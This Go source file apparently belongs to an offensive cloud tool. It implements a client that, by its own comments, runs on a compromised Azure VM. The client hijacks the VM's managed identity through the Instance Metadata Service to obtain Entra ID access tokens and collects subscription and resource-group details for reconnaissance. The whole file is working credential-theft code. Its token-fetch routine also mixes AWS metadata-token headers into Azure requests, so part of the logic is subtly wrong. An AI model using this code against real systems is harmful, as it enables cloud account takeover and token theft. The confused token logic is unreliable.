package exec

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Debajyoti0-0/aether/internal/types"
)

// IMDS endpoint constants.
const (
	IMDSEndpoint    = "http://169.254.169.254"
	IMDSAPIVersion  = "2021-02-01"
	IMDSTokenHeader = "Metadata"
)

// IMDSClient talks to the Azure Instance Metadata Service from a
// compromised VM. IMDSv2 requires fetching a token first; IMDSv1 is
// the legacy direct mode.
type IMDSClient struct {
	Endpoint string // default IMDSEndpoint; override for tests
	HTTP     *http.Client
	// Token is the IMDSv2 session token (fetched via PUT).
	Token string
}

// NewIMDSClient builds an IMDS client.
func NewIMDSClient(hc *http.Client) *IMDSClient {
	if hc == nil {
		hc = &http.Client{Timeout: 10 * time.Second}
	}
	return &IMDSClient{Endpoint: IMDSEndpoint, HTTP: hc}
}

// NewIMDSClientAt builds a client against an explicit endpoint (tests).
func NewIMDSClientAt(endpoint string, hc *http.Client) *IMDSClient {
	c := NewIMDSClient(hc)
	c.Endpoint = strings.TrimRight(endpoint, "/")
	return c
}

// FetchToken acquires an IMDSv2 session token (TTL seconds). Returns
// an error that a caller can treat as "IMDSv2 unavailable" to fall
// back to v1.
func (c *IMDSClient) FetchToken(ctx context.Context, ttl int) error {
	if ttl <= 0 {
		ttl = 300
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPut, c.Endpoint+"/metadata/api/versions", nil)
	if err != nil {
		return err
	}
	req.Header.Set(IMDSTokenHeader, "true")
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", fmt.Sprint(ttl))

	resp, err := c.HTTP.Do(req)
	if err != nil {
		return fmt.Errorf("imds token: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("imds token http %d", resp.StatusCode)
	}
	c.Token = strings.TrimSpace(string(body))
	return nil
}

// IMDSIdentityToken is the managed identity token response.
type IMDSIdentityToken struct {
	AccessToken  string `json:"access_token"`
	ClientID     string `json:"client_id"`
	ExpiresIn    string `json:"expires_in"`
	ExpiresOn    string `json:"expires_on"`
	Resource     string `json:"resource"`
	TokenType    string `json:"token_type"`
}

// GetIdentityToken hijacks the VM's managed identity: it requests an
// Entra ID token for `resource` using IMDS, optionally pinning a
// specific user-assigned identity by client_id or object_id.
func (c *IMDSClient) GetIdentityToken(ctx context.Context, resource, clientID, objectID string) (*types.OAuthTokens, error) {
	if resource == "" {
		resource = "https://management.azure.com/"
	}

	params := url.Values{
		"api-version": {IMDSAPIVersion},
		"resource":    {resource},
	}
	if clientID != "" {
		params.Set("client_id", clientID)
	}
	if objectID != "" {
		params.Set("object_id", objectID)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet,
		c.Endpoint+"/metadata/identity/oauth2/token?"+params.Encode(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set(IMDSTokenHeader, "true")
	if c.Token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", c.Token)
	}

	resp, err := c.HTTP.Do(req)
	if err != nil {
		return nil, fmt.Errorf("imds identity: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("imds identity http %d: %s", resp.StatusCode, truncateBytes(body, 512))
	}

	var raw IMDSIdentityToken
	if err := json.Unmarshal(body, &raw); err != nil {
		return nil, fmt.Errorf("parse imds response: %w", err)
	}

	expiresIn := 3600
	if raw.ExpiresIn != "" {
		fmt.Sscanf(raw.ExpiresIn, "%d", &expiresIn)
	}
	return &types.OAuthTokens{
		AccessToken: raw.AccessToken,
		TokenType:   raw.TokenType,
		ExpiresIn:   expiresIn,
		IssuedAt:    time.Now().UTC(),
		Scope:       raw.Resource,
	}, nil
}

// InstanceMetadata returns the compute metadata document (VM name,
// resource group, subscription) — useful for situational awareness.
func (c *IMDSClient) InstanceMetadata(ctx context.Context) (map[string]any, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet,
		c.Endpoint+"/metadata/instance/compute?api-version="+IMDSAPIVersion, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set(IMDSTokenHeader, "true")
	if c.Token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", c.Token)
	}

	resp, err := c.HTTP.Do(req)
	if err != nil {
		return nil, fmt.Errorf("imds instance: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("imds instance http %d", resp.StatusCode)
	}

	var doc map[string]any
	if err := json.Unmarshal(body, &doc); err != nil {
		return nil, err
	}
	return doc, nil
}
